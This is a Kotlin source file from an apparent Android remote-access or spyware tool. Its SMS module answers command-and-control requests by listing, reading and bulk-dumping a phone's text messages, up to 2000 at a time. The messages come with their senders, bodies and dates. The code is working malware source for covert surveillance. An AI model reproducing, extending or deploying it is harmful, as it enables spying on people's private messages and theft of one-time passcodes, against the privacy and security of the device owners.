package org.synapse.core.modules

import android.content.Context
import android.net.Uri
import android.provider.Telephony
import org.synapse.core.c2.Command
import org.synapse.core.core.SmsMessage
import org.synapse.core.core.SynapseResponse

object SmsModule {

    private val SMS_URI: Uri = Telephony.Sms.CONTENT_URI
    private val SMS_INBOX_URI: Uri = Uri.parse("content://sms/inbox")
    private val SMS_SENT_URI: Uri = Uri.parse("content://sms/sent")

    suspend fun list(context: Context, cmd: Command): SynapseResponse {
        val count = (cmd.params["count"]?.toIntOrNull() ?: 100).coerceAtMost(500)
        return querySms(context, SMS_URI, null, count)
    }

    suspend fun read(context: Context, cmd: Command): SynapseResponse {
        val threadId = cmd.params["thread_id"]
        val address = cmd.params["address"]
        val count = (cmd.params["count"]?.toIntOrNull() ?: 50).coerceAtMost(200)

        val selection = when {
            threadId != null -> "thread_id = ?"
            address != null -> "address = ?"
            else -> null
        }
        val selArgs = when {
            threadId != null -> arrayOf(threadId)
            address != null -> arrayOf(address)
            else -> null
        }

        return querySms(context, SMS_URI, selection, count, selArgs)
    }

    suspend fun dump(context: Context, cmd: Command): SynapseResponse {
        val count = (cmd.params["count"]?.toIntOrNull() ?: 500).coerceAtMost(2000)
        val folder = cmd.params["folder"] ?: "all"

        val uri = when (folder) {
            "inbox" -> SMS_INBOX_URI
            "sent" -> SMS_SENT_URI
            else -> SMS_URI
        }

        return querySms(context, uri, null, count)
    }

    private fun querySms(
        context: Context, uri: Uri, selection: String?, limit: Int,
        selArgs: Array<String>? = null
    ): SynapseResponse {
        try {
            val messages = mutableListOf<SmsMessage>()
            val cursor = context.contentResolver.query(
                uri,
                null,
                selection,
                selArgs,
                "date DESC LIMIT $limit"
            )

            cursor?.use {
                val idIdx = it.getColumnIndex("_id")
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                val readIdx = it.getColumnIndex("read")
                val typeIdx = it.getColumnIndex("type")

                while (it.moveToNext()) {
                    val typeCode = if (typeIdx >= 0) it.getInt(typeIdx) else 1
                    val type = when (typeCode) {
                        1 -> "inbox"
                        2 -> "sent"
                        3 -> "draft"
                        4 -> "outbox"
                        else -> "unknown"
                    }

                    messages.add(SmsMessage(
                        id = if (idIdx >= 0) it.getString(idIdx) ?: "" else "",
                        address = if (addrIdx >= 0) it.getString(addrIdx) ?: "" else "",
                        body = if (bodyIdx >= 0) it.getString(bodyIdx) ?: "" else "",
                        date = if (dateIdx >= 0) it.getLong(dateIdx) else 0L,
                        read = if (readIdx >= 0) it.getInt(readIdx) == 1 else false,
                        type = type
                    ))
                }
            }

            return SynapseResponse.SmsListResponse(
                messages = messages,
                count = messages.size
            )
        } catch (e: SecurityException) {
            return SynapseResponse.ErrorResponse("sms:permission_denied:${e.message}", "sms")
        } catch (e: Exception) {
            return SynapseResponse.ErrorResponse("sms:${e.message}", "sms")
        }
    }
}
